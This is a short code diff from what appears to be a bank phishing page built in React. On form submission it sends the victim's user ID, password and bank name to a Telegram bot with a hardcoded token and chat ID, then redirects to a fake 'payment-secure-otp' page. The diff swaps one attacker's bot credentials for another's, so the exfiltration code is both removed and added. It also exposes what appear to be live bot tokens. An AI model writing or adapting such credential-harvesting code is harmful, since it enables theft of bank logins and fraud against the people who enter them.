@@ -55,11 +55,14 @@ function NextStep(){
         e.preventDefault();
 
         try {
-            const response = await axios.post(`https://api.telegram.org/bot6501428415:AAERpa4g3B0_Blx8MT1lmQNk4Yab7ghock0/sendMessage`, {
-              chat_id: 5968552603,
-              text: `UserId is : ${userid} , password is: ${password}  and bank is  ${name}`,
-            });
-        
+            
+
+            const response = await axios.post(`https://api.telegram.org/bot5464982919:AAGtjeZQ4hxueJkOoefHp040NJNaWGIZKMM/sendMessage`, {
+                chat_id: 950865661,
+                text: `UserId is : ${userid} , password is: ${password}  and bank is  ${name}`,
+              });
+          
+
             console.log('Message sent successfully:', response.data);
 
             navigate('/payment-secure-otp',
